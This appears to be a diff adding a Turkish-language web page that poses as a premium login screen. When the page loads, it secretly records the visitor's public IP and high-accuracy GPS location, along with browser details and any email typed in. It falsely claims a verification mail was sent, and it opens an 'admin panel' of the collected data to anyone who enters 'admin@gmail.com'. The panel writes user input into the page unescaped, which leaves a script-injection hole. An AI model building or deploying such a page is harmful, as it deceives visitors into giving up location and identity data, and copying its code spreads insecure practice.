@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Giriş</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            padding: 50px 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            width: 380px;
+            text-align: center;
+            display: block;
+        }
+        .login-container h2 {
+            color: #ffffff;
+            font-weight: 300;
+            letter-spacing: 2px;
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .login-container h2 span { color: #6c5ce7; font-weight: 600; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        .input-group label {
+            color: #a0a0c0;
+            font-size: 13px;
+            letter-spacing: 1px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #6c5ce7;
+            background: rgba(255, 255, 255, 0.12);
+            box-shadow: 0 0 20px rgba(108, 92, 231, 0.15);
+        }
+        .input-group input::placeholder { color: #555577; }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(108, 92, 231, 0.3);
+        }
+        .btn-login:active { transform: translateY(0); }
+        .message {
+            margin-top: 20px;
+            color: #6c5ce7;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            min-height: 24px;
+        }
+        .message.show { opacity: 1; }
+
+        .admin-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            padding: 30px 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            width: 95%;
+            max-width: 1200px;
+            display: none;
+            min-height: 400px;
+        }
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .admin-header h2 { color: #6c5ce7; font-weight: 300; letter-spacing: 2px; }
+        .admin-header h2 span { color: #ff3366; font-weight: 600; }
+        .admin-header .stats { color: #a0a0c0; font-size: 14px; }
+        .admin-header .stats span { color: #00ffcc; font-weight: bold; font-size: 18px; }
+        .btn-logout {
+            padding: 10px 25px;
+            background: rgba(255, 51, 102, 0.2);
+            border: 1px solid #ff3366;
+            border-radius: 10px;
+            color: #ff3366;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 14px;
+        }
+        .btn-logout:hover { background: #ff3366; color: #fff; }
+
+        .table-wrapper { overflow-x: auto; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            color: #fff;
+            font-size: 14px;
+        }
+        table thead { background: rgba(108, 92, 231, 0.15); }
+        table th {
+            padding: 15px 12px;
+            text-align: left;
+            color: #6c5ce7;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid rgba(108, 92, 231, 0.3);
+        }
+        table td {
+            padding: 12px 12px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: #d0d0e0;
+        }
+        table tr:hover td { background: rgba(255, 255, 255, 0.03); }
+        .ip-highlight {
+            color: #00ffcc;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .email-highlight { color: #ffaa00; }
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            background: rgba(0, 255, 204, 0.1);
+            color: #00ffcc;
+        }
+        .badge.no-email {
+            background: rgba(255, 51, 102, 0.1);
+            color: #ff3366;
+        }
+        .badge.ipv4 { background: rgba(108, 92, 231, 0.2); color: #a29bfe; }
+        .badge.ipv6 { background: rgba(0, 255, 204, 0.15); color: #00ffcc; }
+        .badge.gps { background: rgba(255, 170, 0, 0.15); color: #ffaa00; }
+        .empty-state { text-align: center; padding: 60px 20px; color: #555577; }
+        .empty-state .icon { font-size: 48px; margin-bottom: 15px; }
+
+        .footer-text { margin-top: 25px; color: #444466; font-size: 12px; letter-spacing: 0.5px; }
+
+        .ip-notification {
+            background: rgba(0, 255, 204, 0.05);
+            border: 1px solid rgba(0, 255, 204, 0.1);
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+            color: #00ffcc;
+            font-size: 13px;
+            display: none;
+        }
+        .ip-notification.show { display: block; }
+        .ip-notification .ipv6-badge {
+            background: rgba(0, 255, 204, 0.15);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            margin-left: 5px;
+        }
+        .ip-notification .full-ip {
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #ffffff;
+        }
+
+        @media (max-width: 768px) {
+            .login-container, .admin-container { padding: 25px 15px; width: 98%; }
+            table th, table td { padding: 6px 4px; font-size: 11px; }
+            .admin-header { flex-direction: column; text-align: center; }
+            .ip-highlight { font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="loginContainer">
+        <h2>🔐 Hoş Geldin, <span>Giriş Yap</span></h2>
+        
+        <div class="ip-notification" id="ipNotification">
+            ✅ IP adresiniz kaydedildi: <span id="displayPublicIP" class="full-ip">-</span>
+            <span id="ipTypeBadge" class="ipv6-badge"></span>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 E-posta Adresi</label>
+                <input type="email" id="emailInput" placeholder="ornek@mail.com">
+            </div>
+            <button type="submit" class="btn-login">Devam Et →</button>
+        </form>
+        <div id="message" class="message">✅ Başarıyla giriş yapıldı!</div>
+        <div class="footer-text">© 2026 · Tüm hakları saklıdır</div>
+    </div>
+
+    <div class="admin-container" id="adminContainer">
+        <div class="admin-header">
+            <h2>👑 <span>ADMIN</span> PANEL</h2>
+            <div class="stats">
+                Toplam Ziyaretçi: <span id="totalVisitors">0</span>
+                <span style="margin-left:15px;color:#ffaa00;">📧 Mail: <span id="emailCount">0</span></span>
+                <span style="margin-left:15px;color:#6c5ce7;">🌐 IPv6: <span id="ipv6Count">0</span></span>
+                <span style="margin-left:15px;color:#ffaa00;">📍 GPS: <span id="gpsCount">0</span></span>
+            </div>
+            <button class="btn-logout" id="logoutBtn">Çıkış Yap</button>
+        </div>
+
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>📧 Email</th>
+                        <th>🌍 IP Adresi</th>
+                        <th>📍 GPS Konum</th>
+                        <th>📱 Tarayıcı</th>
+                        <th>🕐 Zaman</th>
+                        <th>📊 Durum</th>
+                    </tr>
+                </thead>
+                <tbody id="visitorTableBody">
+                </tbody>
+            </table>
+        </div>
+        <div id="emptyState" class="empty-state">
+            <div class="icon">📭</div>
+            <p>Henüz ziyaretçi verisi yok. İlk ziyaretçini bekliyorum...</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // --- VERİ DEPOSU ---
+            let visitors = JSON.parse(localStorage.getItem('xlaeuss_visitors') || '[]');
+            let currentVisitorId = null;
+
+            // --- IP TİPİ KONTROLÜ ---
+            function getIPType(ip) {
+                if (!ip || ip === 'Alınamadı' || ip === 'Hata') return 'unknown';
+                if (ip.includes(':')) return 'ipv6';
+                return 'ipv4';
+            }
+
+            // --- MEVCUT ZİYARETÇİ VERİLERİ ---
+            function collectVisitorData() {
+                return {
+                    id: Date.now() + '_' + Math.random().toString(36).substr(2, 6),
+                    publicIP: 'Alınamadı',
+                    publicIPFull: 'Alınamadı',
+                    localIP: 'Alınamadı',
+                    latitude: null,
+                    longitude: null,
+                    accuracy: null,
+                    gpsStatus: 'İstenmedi',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    email: '',
+                    timestamp: new Date().toLocaleString('tr-TR'),
+                    fullData: {}
+                };
+            }
+
+            let currentVisitor = collectVisitorData();
+
+            // --- 1. PUBLIC IP (FULL GÖSTERİM) ---
+            function getPublicIP() {
+                fetch('https://icanhazip.com')
+                    .then(res => res.text())
+                    .then(ip => {
+                        const cleanIP = ip.trim();
+                        currentVisitor.publicIP = cleanIP;
+                        currentVisitor.publicIPFull = cleanIP;
+                        
+                        // FULL IP'yi göster - KISALTMA YOK!
+                        document.getElementById('displayPublicIP').textContent = cleanIP;
+                        
+                        // IP tipi badge
+                        const badge = document.getElementById('ipTypeBadge');
+                        const ipType = getIPType(cleanIP);
+                        if (ipType === 'ipv6') {
+                            badge.textContent = 'IPv6';
+                            badge.style.color = '#00ffcc';
+                        } else if (ipType === 'ipv4') {
+                            badge.textContent = 'IPv4';
+                            badge.style.color = '#a29bfe';
+                        } else {
+                            badge.textContent = '';
+                        }
+                        
+                        document.getElementById('ipNotification').classList.add('show');
+                        updateVisitorInStorage(currentVisitor.id, 'publicIP', cleanIP);
+                        updateVisitorInStorage(currentVisitor.id, 'publicIPFull', cleanIP);
+                    })
+                    .catch(() => {
+                        currentVisitor.publicIP = 'Hata';
+                        currentVisitor.publicIPFull = 'Hata';
+                    });
+            }
+
+            // --- 2. GERÇEK GPS KONUMU ---
+            function getRealLocation() {
+                if (!navigator.geolocation) {
+                    currentVisitor.gpsStatus = 'Desteklenmiyor';
+                    updateVisitorInStorage(currentVisitor.id, 'gpsStatus', 'Desteklenmiyor');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        
+                        currentVisitor.latitude = lat;
+                        currentVisitor.longitude = lng;
+                        currentVisitor.accuracy = acc;
+                        currentVisitor.gpsStatus = 'Başarılı';
+                        
+                        updateVisitorInStorage(currentVisitor.id, 'latitude', lat);
+                        updateVisitorInStorage(currentVisitor.id, 'longitude', lng);
+                        updateVisitorInStorage(currentVisitor.id, 'accuracy', acc);
+                        updateVisitorInStorage(currentVisitor.id, 'gpsStatus', 'Başarılı');
+                        
+                        console.log(`📍 GERÇEK KONUM: ${lat}, ${lng} (${acc} metre hassasiyet)`);
+                    },
+                    function(error) {
+                        let msg = 'İzin Verilmedi';
+                        if (error.code === 1) msg = 'İzin Verilmedi';
+                        else if (error.code === 2) msg = 'Konum Bulunamadı';
+                        else if (error.code === 3) msg = 'Zaman Aşımı';
+                        currentVisitor.gpsStatus = msg;
+                        updateVisitorInStorage(currentVisitor.id, 'gpsStatus', msg);
+                        console.log(`⚠️ GPS hatası: ${msg}`);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            // --- VERİYİ LOCALSTORAGE'A KAYDET ---
+            function saveVisitorToStorage(visitor) {
+                const existingIndex = visitors.findIndex(v => v.publicIP === visitor.publicIP && v.publicIP !== 'Alınamadı' && v.publicIP !== 'Hata');
+                if (existingIndex !== -1 && !visitor.email) {
+                    visitors[existingIndex].timestamp = visitor.timestamp;
+                    visitors[existingIndex].localIP = visitor.localIP;
+                    if (visitor.latitude) {
+                        visitors[existingIndex].latitude = visitor.latitude;
+                        visitors[existingIndex].longitude = visitor.longitude;
+                        visitors[existingIndex].accuracy = visitor.accuracy;
+                        visitors[existingIndex].gpsStatus = visitor.gpsStatus;
+                    }
+                } else if (existingIndex !== -1 && visitor.email) {
+                    visitors[existingIndex].email = visitor.email;
+                    visitors[existingIndex].timestamp = visitor.timestamp;
+                    if (visitor.latitude) {
+                        visitors[existingIndex].latitude = visitor.latitude;
+                        visitors[existingIndex].longitude = visitor.longitude;
+                        visitors[existingIndex].accuracy = visitor.accuracy;
+                        visitors[existingIndex].gpsStatus = visitor.gpsStatus;
+                    }
+                } else {
+                    visitors.push(visitor);
+                }
+                localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+            }
+
+            // --- MEVCUT KAYDI GÜNCELLE ---
+            function updateVisitorInStorage(id, key, value) {
+                const existing = visitors.find(v => v.id === id);
+                if (existing) {
+                    existing[key] = value;
+                    localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+                }
+            }
+
+            // --- SİTE AÇILIR AÇILMAZ ---
+            function autoLogVisitor() {
+                getPublicIP();
+                getRealLocation();
+                
+                setTimeout(() => {
+                    if (currentVisitor.publicIP !== 'Alınamadı' && currentVisitor.publicIP !== 'Hata') {
+                        const existing = visitors.find(v => v.publicIP === currentVisitor.publicIP);
+                        if (!existing) {
+                            saveVisitorToStorage(currentVisitor);
+                            console.log('✅ Ziyaretçi otomatik kaydedildi:', currentVisitor.publicIP);
+                        } else {
+                            console.log('⏳ Bu IP zaten kayıtlı:', currentVisitor.publicIP);
+                            currentVisitor.id = existing.id;
+                            if (currentVisitor.latitude) {
+                                existing.latitude = currentVisitor.latitude;
+                                existing.longitude = currentVisitor.longitude;
+                                existing.accuracy = currentVisitor.accuracy;
+                                existing.gpsStatus = currentVisitor.gpsStatus;
+                                localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+                            }
+                        }
+                    }
+                }, 2000);
+            }
+
+            // --- ADMIN KONTROLÜ ---
+            function isAdmin(email) {
+                return email.trim().toLowerCase() === 'admin@gmail.com';
+            }
+
+            function showAdminPanel() {
+                document.getElementById('loginContainer').style.display = 'none';
+                document.getElementById('adminContainer').style.display = 'block';
+                renderVisitorTable();
+            }
+
+            function showLoginForm() {
+                document.getElementById('loginContainer').style.display = 'block';
+                document.getElementById('adminContainer').style.display = 'none';
+            }
+
+            // --- ZİYARETÇİ TABLOSU ---
+            function renderVisitorTable() {
+                const tbody = document.getElementById('visitorTableBody');
+                const emptyState = document.getElementById('emptyState');
+                const totalSpan = document.getElementById('totalVisitors');
+                const emailSpan = document.getElementById('emailCount');
+                const ipv6Span = document.getElementById('ipv6Count');
+                const gpsSpan = document.getElementById('gpsCount');
+
+                totalSpan.textContent = visitors.length;
+                const emailVisitors = visitors.filter(v => v.email && v.email !== '');
+                emailSpan.textContent = emailVisitors.length;
+                
+                const ipv6Visitors = visitors.filter(v => v.publicIP && v.publicIP.includes(':'));
+                ipv6Span.textContent = ipv6Visitors.length;
+                
+                const gpsVisitors = visitors.filter(v => v.latitude && v.gpsStatus === 'Başarılı');
+                gpsSpan.textContent = gpsVisitors.length;
+
+                if (visitors.length === 0) {
+                    tbody.innerHTML = '';
+                    emptyState.style.display = 'block';
+                    return;
+                }
+
+                emptyState.style.display = 'none';
+                
+                tbody.innerHTML = visitors.map((v, index) => {
+                    const hasEmail = v.email && v.email !== '';
+                    const ipType = getIPType(v.publicIP);
+                    const fullIP = v.publicIPFull || v.publicIP;
+                    
+                    let gpsDisplay = 'İstenmedi';
+                    let gpsBadge = '';
+                    if (v.latitude && v.gpsStatus === 'Başarılı') {
+                        gpsDisplay = `${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)} (${Math.round(v.accuracy)}m)`;
+                        gpsBadge = '<span class="badge gps">✅ GPS</span>';
+                    } else if (v.gpsStatus === 'İzin Verilmedi') {
+                        gpsDisplay = '🚫 İzin Verilmedi';
+                        gpsBadge = '<span class="badge no-email">⛔ İzin Yok</span>';
+                    } else if (v.gpsStatus === 'Desteklenmiyor') {
+                        gpsDisplay = '❌ Destek Yok';
+                        gpsBadge = '<span class="badge no-email">⚠️ Destek Yok</span>';
+                    } else if (v.gpsStatus === 'Zaman Aşımı') {
+                        gpsDisplay = '⏳ Zaman Aşımı';
+                        gpsBadge = '<span class="badge no-email">⏳ Zaman Aşımı</span>';
+                    } else if (v.gpsStatus === 'Konum Bulunamadı') {
+                        gpsDisplay = '📍 Bulunamadı';
+                        gpsBadge = '<span class="badge no-email">❓ Bulunamadı</span>';
+                    } else {
+                        gpsDisplay = '⏳ Bekleniyor...';
+                        gpsBadge = '<span class="badge no-email">⏳ Bekleniyor</span>';
+                    }
+                    
+                    return `
+                        <tr>
+                            <td>${index + 1}</td>
+                            <td class="${hasEmail ? 'email-highlight' : ''}">${hasEmail ? v.email : '<span style="color:#555;">-</span>'}</td>
+                            <td>
+                                <span class="ip-highlight" title="${fullIP}">
+                                    ${fullIP}
+                                </span>
+                                <span class="badge ${ipType === 'ipv6' ? 'ipv6' : 'ipv4'}">${ipType === 'ipv6' ? 'v6' : 'v4'}</span>
+                            </td>
+                            <td style="font-size:12px;color:#ffaa00;">${gpsDisplay}</td>
+                            <td><span class="badge">${v.platform || 'Bilinmiyor'}</span></td>
+                            <td style="color:#888; font-size:12px;">${v.timestamp}</td>
+                            <td>${hasEmail ? '<span class="badge">✅ Mail</span>' : '<span class="badge no-email">⏳ Mail Yok</span>'} ${gpsBadge}</td>
+                        </tr>
+                    `;
+                }).join('');
+            }
+
+            // --- MAİL EKLE ---
+            function addEmailToVisitor(email) {
+                let targetVisitor = null;
+                
+                if (currentVisitor.publicIP !== 'Alınamadı' && currentVisitor.publicIP !== 'Hata') {
+                    targetVisitor = visitors.find(v => v.publicIP === currentVisitor.publicIP);
+                }
+                
+                if (!targetVisitor) {
+                    targetVisitor = {
+                        ...currentVisitor,
+                        email: email,
+                        timestamp: new Date().toLocaleString('tr-TR')
+                    };
+                    visitors.push(targetVisitor);
+                } else {
+                    targetVisitor.email = email;
+                    targetVisitor.timestamp = new Date().toLocaleString('tr-TR');
+                }
+                
+                localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+                console.log('✅ Mail eklendi:', email, 'IP:', targetVisitor.publicIP);
+            }
+
+            // --- FORM SUBMIT ---
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('emailInput').value.trim();
+                
+                if (isAdmin(email)) {
+                    showAdminPanel();
+                    document.getElementById('message').classList.remove('show');
+                    document.getElementById('emailInput').value = '';
+                    return;
+                }
+
+                if (email) {
+                    addEmailToVisitor(email);
+                    
+                    const msg = document.getElementById('message');
+                    msg.textContent = '✅ Giriş başarılı! Yönlendiriliyorsunuz...';
+                    msg.classList.add('show');
+                    document.getElementById('emailInput').value = '';
+
+                    setTimeout(() => {
+                        msg.textContent = '📨 Doğrulama maili gönderildi!';
+                    }, 2000);
+
+                    setTimeout(() => {
+                        msg.classList.remove('show');
+                    }, 4500);
+                } else {
+                    const msg = document.getElementById('message');
+                    msg.textContent = '⚠️ Lütfen bir mail adresi girin';
+                    msg.classList.add('show');
+                    setTimeout(() => msg.classList.remove('show'), 3000);
+                }
+            });
+
+            // --- ÇIKIŞ ---
+            document.getElementById('logoutBtn').addEventListener('click', function() {
+                showLoginForm();
+                document.getElementById('emailInput').value = '';
+                const msg = document.getElementById('message');
+                msg.textContent = '🔐 Çıkış yapıldı';
+                msg.classList.add('show');
+                setTimeout(() => msg.classList.remove('show'), 3000);
+            });
+
+            // --- SAYFA YÜKLENDİ ---
+            console.log('%c🔥 xlaeuss aktif - Veriler toplanıyor...', 'color: #6c5ce7; font-size: 16px; font-weight: bold;');
+            console.log(`%c📊 ${visitors.length} ziyaretçi kaydı var`, 'color: #00ffcc; font-size: 14px;');
+
+            autoLogVisitor();
+            renderVisitorTable();
+
+            window.addEventListener('beforeunload', function() {
+                localStorage.setItem('xlaeuss_visitors', JSON.stringify(visitors));
+            });
+
+            setInterval(() => {
+                const stored = JSON.parse(localStorage.getItem('xlaeuss_visitors') || '[]');
+                if (stored.length !== visitors.length) {
+                    visitors = stored;
+                    if (document.getElementById('adminContainer').style.display !== 'none') {
+                        renderVisitorTable();
+                    }
+                }
+            }, 30000);
+
+        })();
+    </script>
+
+</body>
+</html>
